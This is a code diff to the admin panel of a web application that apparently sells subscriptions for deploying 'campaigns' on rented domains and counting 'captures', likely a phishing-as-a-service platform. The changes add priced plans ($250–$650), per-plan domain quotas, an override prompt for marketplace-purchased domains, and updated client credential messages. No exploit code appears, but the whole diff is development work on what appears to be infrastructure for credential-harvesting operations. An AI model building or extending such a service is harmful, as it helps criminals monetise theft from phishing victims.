@@ -2789,7 +2789,9 @@ HTML_TEMPLATE = r'''
                             <label class="token-label" style="margin-bottom:4px; display:block;">SUBSCRIPTION DURATION</label>
                             <select id="sub-duration-input" class="lg-input" style="width:100%;">
                                 <option value="7">7 Days (Trial)</option>
+                                <option value="14">14 Days (2 Weeks)</option>
                                 <option value="30" selected>30 Days (1 Month)</option>
+                                <option value="60">60 Days (2 Months)</option>
                                 <option value="90">90 Days (3 Months)</option>
                                 <option value="365">365 Days (1 Year)</option>
                                 <option value="0">Lifetime (No Expiry)</option>
@@ -2797,15 +2799,15 @@ HTML_TEMPLATE = r'''
                         </div>
                         <div>
                             <label class="token-label" style="margin-bottom:4px; display:block;">PLAN TIER</label>
-                            <select id="sub-plan-input" class="lg-input" style="width:100%;">
-                                <option value="Starter">Starter (5 Links)</option>
-                                <option value="Pro" selected>Pro (15 Links)</option>
-                                <option value="Enterprise">Enterprise Unlimited</option>
+                            <select id="sub-plan-input" class="lg-input" onchange="syncPlanQuota()" style="width:100%;">
+                                <option value="2 Weeks" data-duration="14" data-quota="1">2 Weeks — $250 (1 Domain)</option>
+                                <option value="1 Month" selected data-duration="30" data-quota="2">1 Month — $350 (2 Domains)</option>
+                                <option value="2 Months" data-duration="60" data-quota="4">2 Months — $650 (4 Domains)</option>
                             </select>
                         </div>
                     </div>
                     <div>
-                        <label class="token-label" style="margin-bottom:4px; display:block;">MAX ACTIVE LINKS QUOTA</label>
+                            <label class="token-label" style="margin-bottom:4px; display:block;">INCLUDED DEPLOYMENT DOMAINS</label>
                         <input type="number" id="sub-quota-input" class="lg-input" value="15" min="1" max="1000" style="width:100%;">
                     </div>
                     <div style="display:flex; justify-content:flex-end; gap:10px; margin-top:8px;">
@@ -10217,8 +10219,8 @@ Please keep your access key confidential.`;
                             </div>
                         </td>
                         <td style="padding:12px 14px;">
-                            <span style="font-weight:700; color:#ffffff;">${s.deployment_count || 0}</span> / <span style="color:var(--text-secondary);">${s.max_deployments || 15}</span>
-                            <div style="font-size:10px; color:var(--text-secondary);">${s.capture_count || 0} captures</div>
+                            <span style="font-weight:700; color:#ffffff;">${s.domain_count || 0}</span> / <span style="color:var(--text-secondary);">${s.max_deployments || 2}</span>
+                            <div style="font-size:10px; color:var(--text-secondary);">domains included · ${s.capture_count || 0} captures</div>
                         </td>
                         <td style="padding:12px 14px;">
                             ${domBadge}
@@ -10404,7 +10406,7 @@ Portal Login URL: ${portalUrl}
 Client Username:  ${sub.username}
 Login Password:   ${savedPass}
 Subscription:     ${sub.plan_name || 'Pro'}
-Active Links:     ${sub.max_deployments || 15} Max Quota
+Domains Included: ${sub.max_deployments || 2}
 Expires On:       ${sub.subscription_expires_at || 'Lifetime (No Expiry)'}
 Status:           ${(sub.status || 'active').toUpperCase()}
 ────────────────────────────────────────
@@ -10434,6 +10436,7 @@ Log in to your private portal to deploy campaigns and track captures.`;
             const duration_days = document.getElementById('sub-duration-input').value;
             const plan_name = document.getElementById('sub-plan-input').value;
             const max_deployments = document.getElementById('sub-quota-input').value;
+            const quota_display = plan_name === 'Enterprise' ? 'Unlimited' : max_deployments;
 
             try {
                 const res = await fetch('/api/admin/subscribers/create', {
@@ -10445,7 +10448,7 @@ Log in to your private portal to deploy campaigns and track captures.`;
                 if (data.success) {
                     closeSubscriberModal();
                     await loadSubscribers();
-                    openClientCredentialsModal(username, password, plan_name, max_deployments, data.expires_at);
+                    openClientCredentialsModal(username, password, plan_name, quota_display, data.expires_at);
                     showToast(`✓ Client subscriber "${username}" provisioned successfully!`);
                 } else {
                     showToast('⚠️ ' + (data.error || 'Failed to create subscriber'));
@@ -10453,6 +10456,17 @@ Log in to your private portal to deploy campaigns and track captures.`;
             } catch (err) {
                 showToast('⚠️ Network error: ' + err);
             }
+        }
+
+        /* Pricing plans drive duration + included deployment domains. */
+        function syncPlanQuota() {
+            const plan = document.getElementById('sub-plan-input').value;
+            const q = document.getElementById('sub-quota-input');
+            const d = document.getElementById('sub-duration-input');
+            const opt = document.querySelector('#sub-plan-input option:checked');
+            if (!opt) return;
+            if (d && opt.dataset.duration) d.value = opt.dataset.duration;
+            if (q && opt.dataset.quota) { q.value = opt.dataset.quota; q.disabled = false; q.style.opacity = '1'; }
         }
 
         function openRenewModal(cid, username) {
@@ -10622,17 +10636,25 @@ Log in to your private portal to deploy campaigns and track captures.`;
                 showToast('⚠️ Please select an owned domain from the dropdown.');
                 return;
             }
+            await _assignDomainRequest(cid, domain, false);
+        }
+
+        async function _assignDomainRequest(cid, domain, override) {
             try {
                 const res = await fetch(`/api/admin/subscribers/${cid}/assign-domain`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ domain })
+                    body: JSON.stringify({ domain, override })
                 });
                 const data = await res.json();
                 if (data.success) {
                     await loadSubscribers();
                     renderClientAssignedDomainsList();
                     showToast(`✓ Domain "${domain}" transferred to client!`);
+                } else if (res.status === 409 && data.quota) {
+                    if (confirm(data.error + '\n\nAssign anyway? (Choose YES if the client purchased this domain via the Marketplace.)')) {
+                        await _assignDomainRequest(cid, domain, true);
+                    }
                 } else {
                     showToast('⚠️ ' + (data.error || 'Failed to assign domain'));
                 }
@@ -18044,6 +18066,21 @@ def api_subscribers_assign_domain(cid):
     domain = data.get('domain', '').strip()
     if not domain:
         return jsonify({'error': 'Domain is required'}), 400
+    override = bool(data.get('override'))
+    # Marketplace purchases are paid for — they always bypass the plan's included-domain quota.
+    pending_for = _dep.get_domain_pending_client(domain)
+    purchased_by_client = (pending_for == cid)
+    if not override and not purchased_by_client:
+        client = db.get_operator(cid)
+        if client:
+            plan_name, max_dom = db.get_client_plan_quota(cid)
+            if max_dom and 'enterprise' not in (plan_name or '').lower():
+                owned = _dep.count_client_domains(cid)
+                if owned >= max_dom:
+                    return jsonify({
+                        'error': f'PLAN_QUOTA: {client["username"]} already owns {owned} domain(s) — the {plan_name} plan includes {max_dom}. Assign anyway if the client purchased extra?',
+                        'quota': True, 'owned': owned, 'max': max_dom
+                    }), 409
     # Ownership TRANSFER: the domain leaves the master pool / marketplace inventory
     # and becomes the subscriber's private property.
     transferred = _dep.transfer_domain_to_client(domain, cid)
